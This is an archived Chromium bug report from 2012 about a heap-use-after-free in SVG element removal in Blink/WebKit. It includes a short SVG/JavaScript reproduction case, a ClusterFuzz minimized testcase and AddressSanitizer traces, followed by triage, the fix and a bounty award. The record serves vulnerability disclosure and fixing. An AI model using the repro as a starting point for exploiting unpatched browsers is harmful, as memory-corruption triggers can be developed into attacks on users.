# Heap-use-after-free in WebCore::SVGElement::removedFromDocument

| Field | Value |
|-------|-------|
| **Issue ID** | [40053110](https://issues.chromium.org/issues/40053110) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ax...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2012-01-28 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Heap use after free can be triggered in SVG while changing document and using it contents.

**VERSION**  

18.0.1018.0 (Developer Build 119055 Linux)  

Does not reproduce on 16.0.912.77 m, Win7 x64.

**REPRODUCTION CASE**  

<svg xmlns="http://www.w3.org/2000/svg">  

<font>  

<font-face id="f" font-family="SVGArial"/>  

</font>  

<stop id="s"/>  

<script>  

x = document.createRange();  

x.selectNodeContents( document.getElementById('s') );  

x.surroundContents( document.getElementById('f') );  

location.reload();  

</script>  

</svg>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

==6238== ERROR: AddressSanitizer heap-use-after-free on address 0x7f26eef76aa8 at pc 0x7f27000e8e5d bp 0x7fff958b3ca0 sp 0x7fff958b3c98  

READ of size 8 at 0x7f26eef76aa8 thread T0  

#0 0x7f27000e8e5d in WebCore::SVGElement::removedFromDocument() /usr/local/google/asan/asan-llvm-trunk/llvm/projects/compiler-rt/lib/asan/asan\_allocator.cc:0  

#1 0x7f26fe31c494 in WebCore::Private::NodeRemovalDispatcher<WebCore::Node, true>::dispatch(WebCore::Node\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNodeAlgorithms.h:99  

#2 0x7f26fe335068 in WTF::OwnPtr[WebCore::DocumentMarkerController](javascript:void(0);)::operator->() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/OwnPtr.h:64  

#3 0x7f26ff9aa138 in WTF::RefCounted[WebCore::Range](javascript:void(0);)::operator delete(void\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefCounted.h:178  

#4 0x7f26ff273231 in void WebCore::DOMData::handleWeakObject<void>(WebCore::DOMDataStore::DOMWrapperMapType, v8::Persistent[v8::Object](javascript:void(0);), void\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/DOMData.h:84  

#5 0x7f26ff273062 in WebCore::DOMDataStore::weakDOMObjectCallback(v8::Persistent[v8::Value](javascript:void(0);), void\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/DOMDataStore.cpp:135  

#6 0x7f26fd315089 in v8::internal::RuntimeProfiler::IsEnabled() /media/Chromium/chromium/depot\_tools/src/v8/src/runtime-profiler.h:50  

0x7f26eef76aa8 is located 40 bytes inside of 136-byte region [0x7f26eef76a80,0x7f26eef76b08)  

freed by thread T0 here:  

#0 0x7f27023e4dc2 in operator delete(void\*) ??:0  

#1 0x7f26ff5a9cc2 in ~HashTable /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/HashTable.h:313  

#2 0x7f26ff5a9a3e in WebCore::CachedResourceClient::operator delete(void\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/cache/CachedResourceClient.h:35  

#3 0x7f26ff2a675a in WTF::VectorDestructor<true, WTF::OwnPtr[WebCore::CSSFontFaceSource](javascript:void(0);) >::destruct(WTF::OwnPtr[WebCore::CSSFontFaceSource](javascript:void(0);)\*, WTF::OwnPtr[WebCore::CSSFontFaceSource](javascript:void(0);)\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/Vector.h:57  

#4 0x7f26ff2a5d6a in WTF::VectorDestructor<true, WTF::RefPtr[WebCore::CSSFontFace](javascript:void(0);) >::destruct(WTF::RefPtr[WebCore::CSSFontFace](javascript:void(0);)\*, WTF::RefPtr[WebCore::CSSFontFace](javascript:void(0);)\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/Vector.h:57  

#5 0x7f26ff2976ce in WTF::RefCounted[WebCore::FontSelector](javascript:void(0);)::operator delete(void\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefCounted.h:178  

#6 0x7f26fddf58c1 in ~HashTable /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/HashTable.h:313  

#7 0x7f26fddf56cd in ~FontFallbackList /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefCounted.h:178  

#8 0x7f26ff90f642 in ~RefPtr /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:58  

#9 0x7f26fdd8d198 in WTF::RefCounted[WebCore::StyleInheritedData](javascript:void(0);)::operator delete(void\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefCounted.h:178  

#10 0x7f26fec6552f in WebCore::RenderStyle::~RenderStyle() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefCounted.h:178  

#11 0x7f26fec0534e in WTF::HashTable<unsigned int, std::pair<unsigned int, WebCore::CSSStyleSelector::MatchedStyleDeclarationCacheItem>, WTF::PairFirstExtractor<std::pair<unsigned int, WebCore::CSSStyleSelector::MatchedStyleDeclarationCacheItem> >, WTF::IntHash<unsigned int>, WTF::PairHashTraits<WTF::HashTraits<unsigned int>, WTF::HashTraits[WebCore::CSSStyleSelector::MatchedStyleDeclarationCacheItem](javascript:void(0);) >, WTF::HashTraits<unsigned int> >::deallocateTable(std::pair<unsigned int, WebCore::CSSStyleSelector::MatchedStyleDeclarationCacheItem>\*, int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/HashTable.h:927  

#12 0x7f26fe347624 in WebCore::CSSStyleSelector::operator delete(void\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/css/CSSStyleSelector.h:102  

#13 0x7f27001a6c1d in WebCore::SVGFontFaceElement::removedFromDocument() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/SVGFontFaceElement.cpp:330  

#14 0x7f26fe31c494 in WebCore::Private::NodeRemovalDispatcher<WebCore::Node, true>::dispatch(WebCore::Node\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ContainerNodeAlgorithms.h:99  

#15 0x7f26fe335068 in WTF::OwnPtr[WebCore::DocumentMarkerController](javascript:void(0);)::operator->() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/OwnPtr.h:64  

#16 0x7f26ff9aa138 in WTF::RefCounted[WebCore::Range](javascript:void(0);)::operator delete(void\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefCounted.h:178  

#17 0x7f26ff273231 in void WebCore::DOMData::handleWeakObject<void>(WebCore::DOMDataStore::DOMWrapperMapType, v8::Persistent[v8::Object](javascript:void(0);), void\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/DOMData.h:84  

#18 0x7f26ff273062 in WebCore::DOMDataStore::weakDOMObjectCallback(v8::Persistent[v8::Value](javascript:void(0);), void\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/DOMDataStore.cpp:135  

#19 0x7f26fd315089 in v8::internal::RuntimeProfiler::IsEnabled() /media/Chromium/chromium/depot\_tools/src/v8/src/runtime-profiler.h:50  

previously allocated by thread T0 here:  

#0 0x7f27023e4c42 in operator new(unsigned long) ??:0  

#1 0x7f27001a353e in WebCore::SVGFontFaceElement::create(WebCore::QualifiedName const&, WebCore::Document\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/svg/SVGFontFaceElement.cpp:61  

#2 0x7f27000333b6 in WTF::PassRefPtr[WebCore::SVGFontFaceElement](javascript:void(0);)::leakRef() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:161  

#3 0x7f270002e1fc in WebCore::SVGElementFactory::createSVGElement(WebCore::QualifiedName const&, WebCore::Document\*, bool) /media/Chromium/chromium/depot\_tools/src/out/Release/obj/gen/webkit/SVGElementFactory.cpp:642  

#4 0x7f26fe336f38 in WTF::PassRefPtr[WebCore::SVGElement](javascript:void(0);)::leakRef() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:161  

#5 0x7f26ff21d39a in WTF::PassRefPtr[WebCore::Element](javascript:void(0);)::leakRef() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:161  

#6 0x7f26fdf23c56 in xmlParseStartTag2 /media/Chromium/chromium/depot\_tools/src/third\_party/libxml/src/parser.c:9126  

#7 0x7f26fdf2ca69 in xmlParseTryOrFinish /media/Chromium/chromium/depot\_tools/src/third\_party/libxml/src/parser.c:10847  

#8 0x7f26fdf2a1fc in xmlParseChunk /media/Chromium/chromium/depot\_tools/src/third\_party/libxml/src/parser.c:11625  

#9 0x7f26ff21baf8 in WebCore::DocumentParser::isStopped() const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/DocumentParser.h:69  

#10 0x7f26ff215ae5 in ~RefPtr /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:58  

#11 0x7f2701d7a739 in ~Deque /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/Deque.h:370  

#12 0x7f26fef9d46f in WebCore::DocumentLoader::commitData(char const\*, unsigned long) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/DocumentLoader.cpp:327  

#13 0x7f26fde1eb68 in WebKit::FrameLoaderClientImpl::committedLoad(WebCore::DocumentLoader\*, char const\*, int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebKit/chromium/src/FrameLoaderClientImpl.cpp:1125  

#14 0x7f26fef9d08c in WebCore::DocumentLoader::commitLoad(char const\*, int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/DocumentLoader.cpp:313  

#15 0x7f26ff03249e in WebCore::ResourceLoader::didReceiveData(char const\*, int, long long, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/ResourceLoader.cpp:291  

#16 0x7f26ff00fa20 in WebCore::MainResourceLoader::didReceiveData(char const\*, int, long long, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/MainResourceLoader.cpp:464  

#17 0x7f26ff033b8b in WebCore::InspectorInstrumentation::hasFrontends() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/inspector/InspectorInstrumentation.h:217  

#18 0x7f26fdcc37a2 in ResourceDispatcher::OnReceivedData(IPC::Message const&, int, base::FileDescriptor, int, int) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:404  

#19 0x7f26fdcc1ed5 in ResourceDispatcher::DispatchMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/./content/common/resource\_messages.h:154  

#20 0x7f26fdcbfec0 in ResourceDispatcher::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:326  

#21 0x7f26fdbca91f in ChildThread::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/child\_thread.cc:171  

#22 0x7f26fdd18849 in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_proxy.cc:263  

==6238== ABORTING  

Stats: 40M malloced (30M for red zones) by 82744 calls  

Stats: 2M realloced by 3475 calls  

Stats: 36M freed by 68055 calls  

Stats: 0M really freed by 0 calls  

Stats: 100M (25615 full pages) mmaped in 25 calls  

mmaps by size class: 8:65532; 9:16382; 10:12285; 11:2047; 12:1024; 13:1536; 14:256; 15:256; 16:64; 17:64; 18:16; 19:8; 21:6;  

mallocs by size class: 8:62234; 9:8847; 10:7904; 11:1676; 12:380; 13:1302; 14:162; 15:152; 16:23; 17:43; 18:11; 19:5; 21:5;  

frees by size class: 8:49693; 9:7877; 10:7301; 11:1311; 12:270; 13:1255; 14:144; 15:138; 16:16; 17:29; 18:11; 19:5; 21:5;  

rfrees by size class:  

Stats: malloc large: 64 small slow: 422  

Shadow byte and word:  

0x1fe4dddeed55: fd  

0x1fe4dddeed50: fd fd fd fd fd fd fd fd  

More shadow bytes:  

0x1fe4dddeed30: fd fd fd fd fd fd fd fd  

0x1fe4dddeed38: fd fd fd fd fd fd fd fd  

0x1fe4dddeed40: fa fa fa fa fa fa fa fa  

0x1fe4dddeed48: fa fa fa fa fa fa fa fa  

=>0x1fe4dddeed50: fd fd fd fd fd fd fd fd  

0x1fe4dddeed58: fd fd fd fd fd fd fd fd  

0x1fe4dddeed60: fd fd fd fd fd fd fd fd  

0x1fe4dddeed68: fd fd fd fd fd fd fd fd  

0x1fe4dddeed70: fa fa fa fa fa fa fa fa

## Attachments

- [fix](attachments/fix) (text/x-diff; charset=us-ascii, 510 B)

## Timeline

### in...@chromium.org (2012-01-28)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=16179234

Uploader: aarya@google.com

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7faba37cb7a8
Crash State:
  - crash stack -
  WebCore::SVGElement::removedFromDocument
  void WebCore::removeAllChildrenInContainer<WebCore::Node, WebCore::ContainerNode>
  - free stack -
  operator delete
  WebCore::CSSFontFaceSource::~CSSFontFaceSource
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=117208:117803

Minimized Testcase (0.33 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv95oNfW5fNBLzbf6NcgtMSxB1cLq76vYoSXGBhlpBsoHDD8rraDLLZqvEeZcj89NblHzCufewiLC8cLvHre8gMefUCrdq5jjl-u4XKouu8ygVrXf4x051EGKhj9ZwkpUTWx4KueRyxhe0C9n2lcH83KjMXkuHQ
<svg xmlns="http://www.w3.org/2000/svg">
    <font>
        <font-face id="f" font-family="SVGArial"/>
    <stop id="s"/>
    <script>
        x = document.createRange();
        x.selectNodeContents( document.getElementById('s') );
        x.surroundContents( document.getElementById('f') );
        location.reload();
    </script>

### in...@chromium.org (2012-01-28)

Upstreamed - https://bugs.webkit.org/show_bug.cgi?id=77270
looks to have regressed in https://trac.webkit.org/changeset/105005/

### js...@chromium.org (2012-01-28)

I think the regression range is wrong here. It shows as regressing 3 weeks ago, but is crashing on m17 beta.

### in...@chromium.org (2012-01-30)

there is almost 0% chance that the regression range is wrong since we now compare the crash stacks, and when i clicked redo, it still came up with same range. Also, i am quite confident that it is mitz's font change did it.

Marty, can you try check the repro against asan latest beta and see if it still crashes.  it shouldn't be in m17 unless someone merged it to m17 branch.
Branched Chromium at revision 113143
Branched Webkit at revision 101876
Marty, this might be a problem in an intermediate faulty build that cause the repro to not crash there, or might need a higher timeout for the repro. can you try this locally and see what might be going wrong.

### mb...@chromium.org (2012-01-30)

This does seem to be reproducing with the same stack in the latest m17 asan beta. I'll try to see what might be going on with the regression range now.

### in...@chromium.org (2012-02-03)

attaching patch using my left, someone needs to help through review, layouttest.

### in...@chromium.org (2012-02-03)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-04)

Ryosuke has a generic patch upstream. This should cover areas other than svg as well. Really like the approach.

### in...@chromium.org (2012-02-15)

http://trac.webkit.org/changeset/107749

### sc...@gmail.com (2012-03-01)

M17: http://trac.webkit.org/changeset/109363
M18: http://trac.webkit.org/changeset/109364

### sc...@gmail.com (2012-03-03)

@Ax330d: wonderful bug as always.
$1000

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-03-03)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-21)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-06-13)

ClusterFuzz has detected this issue as fixed in range 122064:122080.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=16179234

Uploader: aarya@google.com

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f2554da86a8
Crash State:
  - crash stack -
  WebCore::SVGElement::removedFromDocument
  void WebCore::removeAllChildrenInContainer<WebCore::Node, WebCore::ContainerNode>
  - free stack -
  WebCore::CSSFontFaceSource::~CSSFontFaceSource
  WebCore::CSSFontFaceSource::~CSSFontFaceSource
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=117208:117803
Fixed: https://cluster-fuzz.appspot.com/revisions?range=122064:122080

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv97jjjO9rptL2trXJF3HkhfTtXbS7GMnDf5L08aCeAPs_7Fww7aUIrpS8DNC67m8Q5Q-UnR-dmWFdyKV-8TIRthUnKsfNZyuU-CtNzQLRx4URv9NkjsQYXiyOfGRcxeA9BMel-f55V23uPuWB1_fakjUuA_nAQ

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/111748?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053110)*
